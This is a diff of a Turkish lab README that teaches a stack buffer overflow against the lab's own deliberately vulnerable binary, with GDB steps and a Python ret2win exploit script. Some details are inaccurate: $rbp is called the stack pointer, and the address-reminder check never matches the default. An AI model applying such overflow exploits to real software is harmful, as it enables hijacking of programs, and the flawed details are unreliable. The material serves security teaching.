@@ -1,7 +1,3 @@
-Harika bir fikir. Sağladığınız komutlar ve GDB inceleme adımını temel alarak, Stack Buffer Overflow zafiyetini derinlemesine analiz eden, önceki şablona uygun yeni bir README dosyası aşağıda oluşturulmuştur.
-
------
-
 # CyberLabs: Stack Buffer Overflow ile Akış Kontrolü Laboratuvarı
 
 **Modül Kodu:** CL-MEM-002
@@ -18,7 +14,7 @@ Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, klasik **
   * `g++` derleyicisi ile exploit geliştirmeyi kolaylaştıran bayrakları (`-fno-stack-protector`, `-z execstack`, `-no-pie`) kullanarak program derlemek.
   * `objdump` ile bir program üzerinde statik analiz yaparak fonksiyon adreslerini tespit etmek.
   * `gdb` (GNU Debugger) ile dinamik analiz yapmak, programı çökertmek ve yığın (stack) durumunu analiz etmek.
-  * GDB içerisinde `x/32gx $rsp` gibi komutlar kullanarak yığın üzerindeki veriyi doğrudan incelemek ve sömürü için gereken ofset (offset) değerini doğrulamak.
+  * GDB içerisinde `x/32gx $rbp` gibi komutlar kullanarak yığın üzerindeki veriyi doğrudan incelemek ve sömürü için gereken ofset (offset) değerini doğrulamak.
 
 ## Disclaimer / Yasal Uyarı
 
@@ -45,17 +41,21 @@ g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable
 
 ### 2\. Statik Analiz: Hedef Fonksiyon Adresini Bulma
 
-Amacımız, programın akışını normalde çağrılmayacak bir fonksiyona (örneğin `win_function`) yönlendirmektir. Bunun için `objdump` aracı ile bu fonksiyonun bellekteki adresini bulmamız gerekir.
+<img width="733" height="75" alt="resim" src="https://github.com/user-attachments/assets/c407363a-8b4b-48b5-a5f0-d73113a554de" />
+
+Amacımız, programın akışını normalde çağrılmayacak bir fonksiyona (örneğin `hedef_fonksiyon`) yönlendirmektir. Bunun için `objdump` aracı ile bu fonksiyonun bellekteki adresini bulmamız gerekir.
 
 ```bash
-objdump -d ./vulnerable_code | grep win_function
+objdump -d ./vulnerable_code | grep hedef_fonksiyon
 ```
 
-Bu komutun çıktısı size `win_function`'un başlangıç adresini verecektir. Örneğin:
-`0000000000401186 <win_function>:`
+Bu komutun çıktısı size `hedef_fonksiyon`'un başlangıç adresini verecektir. Örneğin:
+`0000000000401186 <hedef_fonksiyon>:`
 Bu durumda hedef adresimiz `0x401186` olacaktır.
 
 ### 3\. Dinamik Analiz: Zafiyeti GDB ile Tetikleme
+
+<img width="1111" height="491" alt="resim" src="https://github.com/user-attachments/assets/6e376db3-7dba-47ae-90a8-b11294642aff" />
 
 Şimdi zafiyetin varlığını ve etkisini GDB (GNU Debugger) ile canlı olarak inceleyeceğiz.
 
@@ -71,9 +71,12 @@ GDB ortamı açıldıktan sonra, programı arabelleği taşıracak özel bir gir
 
 Program, geri dönüş adresinin `0x4141414141414141` gibi geçersiz bir adresle üzerine yazıldığı için "Segmentation fault" hatası vererek çökecektir. Bu, kontrolü ele geçirmeye çok yakın olduğumuzu gösterir.
 
-### 4\. Yığını İnceleme: `x/32gx $rsp`
+### 4\. Yığını İnceleme: `x/32gx $rbp`
 
-Çökme anında yığının (stack) durumunu görmek, sömürü kodunu yazmak için en kritik adımdır. `x/32gx $rsp` komutu, çökme anında yığın işaretçisinin (`$rsp`) gösterdiği yerden başlayarak belleği incelememizi sağlar.
+<img width="1106" height="705" alt="resim" src="https://github.com/user-attachments/assets/94d10fb4-10b5-4e33-be4a-5eb55f6ccafd" />
+
+
+Çökme anında yığının (stack) durumunu görmek, sömürü kodunu yazmak için en kritik adımdır. `x/32gx $rbp` komutu, çökme anında yığın işaretçisinin (`$rbp`) gösterdiği yerden başlayarak belleği incelememizi sağlar.
 
   * `x`: e**x**amine (incele) komutu.
   * `/32gx`: 32 adet **g**iant word (64-bit) veriyi he**x** formatında göster.
@@ -81,7 +84,7 @@ Program, geri dönüş adresinin `0x4141414141414141` gibi geçersiz bir adresle
 <!-- end list -->
 
 ```
-(gdb) x/32gx $rsp
+(gdb) x/32gx $rbp
 ```
 
 Bu komutun çıktısı şuna benzer olacaktır:
@@ -99,6 +102,8 @@ Bu komutun çıktısı şuna benzer olacaktır:
 
 ### 5\. Exploit'i Geliştirme ve Çalıştırma
 
+<img width="681" height="290" alt="resim" src="https://github.com/user-attachments/assets/446ab1a1-d524-4318-8f45-44d057ae05bf" />
+
 Artık tüm bilgilere sahibiz:
 
 1.  **Gereken Dolgu Boyutu:** 72 byte.
@@ -107,7 +112,7 @@ Artık tüm bilgilere sahibiz:
 Bu bilgileri kullanarak exploit'imizi yazabiliriz. Payload'ımız `[ 72 byte 'A' ] + [ 8 byte Hedef Adres ]` şeklinde olacaktır.
 
 ```python
-# exploit.py
+# exploit_final.py
 import struct
 import subprocess
 import sys
@@ -116,33 +121,38 @@ import sys
 VICTIM_PROGRAM = "./vulnerable_code"
 
 # --- GDB ILE BU ADRESI KENDI SISTEMINIZDE BULUN ---
-# Örneğin: 0x401146
+# Örneğin: 0x4011e9
 HEDEF_ADRES = 0x401146  # <-- BU SATIRI GDB'DEN ALDIĞINIZ ADRES ILE GÜNCELLEYİN
 
 # 64-bit mimari için hesaplanan padding boyutu
+# [64 byte buffer] + [8 byte kaydedilmiş RBP] = 72 byte
 PADDING_SIZE = 72
 
 def main():
     """
     Sömürü işlemini başlatan ana fonksiyon.
     """
-    print("--- [SALDIRGAN] Gelişmiş Buffer Overflow Exploit Başlatıldı ---")
+    print("--- [SALDIRGAN] Stack Overflow Exploit Baslatildi ---")
     
-    if HEDEF_ADRES == 0x401146 and "guncelleyin" in "GUNCELLEYIN": # Basit bir kontrol
+    if HEDEF_ADRES == 0x4011e9:
         print("\n[!] UYARI: HEDEF_ADRES'i kendi sisteminizdeki adresle güncellemeyi unutmayın!\n")
 
-    print(f"[*] Hedef Program: {VICTIM_PROGRAM}")
     print(f"[*] Hedef Adres: {hex(HEDEF_ADRES)}")
     print(f"[*] Padding Boyutu: {PADDING_SIZE}")
     
     # Payload'ı oluştur: [ 72 byte dolgu ('A') ] + [ 8 byte hedef adres ]
     padding = b'A' * PADDING_SIZE
+    
+    # Adresi 64-bit (8 byte) ve little-endian formatında paketle
     overwrite_address = struct.pack("<Q", HEDEF_ADRES)
+    
     payload = padding + overwrite_address
     
     print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
     
     try:
+        # Zafiyetli programı bir alt süreç olarak başlatıyoruz.
+        # stdin'e yazma, stdout/stderr'den okuma yapmak için pipe'ları bağlıyoruz.
         p = subprocess.Popen(
             [VICTIM_PROGRAM], 
             stdin=subprocess.PIPE, 
@@ -155,26 +165,31 @@ def main():
         
     print("[*] Payload kurban programa gonderiliyor...")
     
+    # Payload'ı programın standart girdisine gönder ve çıktıyı al
     stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
+    
+    # Çıktıyı daha rahat işlemek için byte'tan string'e dönüştür
     stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
     
-    print("\n--- Kurban Programdan Gelen Çıktı ---")
+    print("\n--- Kurban Programdan Gelen Cikti ---")
     print(stdout_output)
     print("------------------------------------")
     
-    # Programın çıktısında belirlediğimiz başarı anahtar kelimesini arıyoruz.
-    if "Zafiyet Basariyla Somuruldu" in stdout_output:
-        print("\n[+] Başarılı! Zafiyet istismar edildi ve kontrol ele geçirildi!")
+    # Programın çıktısında belirlediğimiz anahtar kelimeyi arıyoruz.
+    if "KONTROL ELE GECIRILDI" in stdout_output:
+        print("\n[+] Zafiyet basariyla istismar edildi!")
     else:
-        print("\n[-] Başarısız. Adresi veya ofseti kontrol edin.")
+        print("\n[-] Istismar basarisiz oldu. Adresi veya ofseti kontrol edin.")
+        # Hata ayıklama için stderr'i de yazdırabiliriz
         stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')
         if stderr_output:
-            print("\n--- Hata Çıktısı (stderr) ---")
+            print("\n--- Hata Ciktisi (stderr) ---")
             print(stderr_output)
 
 
 if __name__ == "__main__":
     main()
+
 ```
 
-Exploit'i çalıştırdığınızda, programın çıktısında `win_function` içinde tanımlanmış olan başarı mesajını görmelisiniz. Bu, programın akışını başarıyla ele geçirdiğiniz anlamına gelir.
+Exploit'i çalıştırdığınızda, programın çıktısında `hedef_fonksiyon` içinde tanımlanmış olan başarı mesajını görmelisiniz. Bu, programın akışını başarıyla ele geçirdiğiniz anlamına gelir.
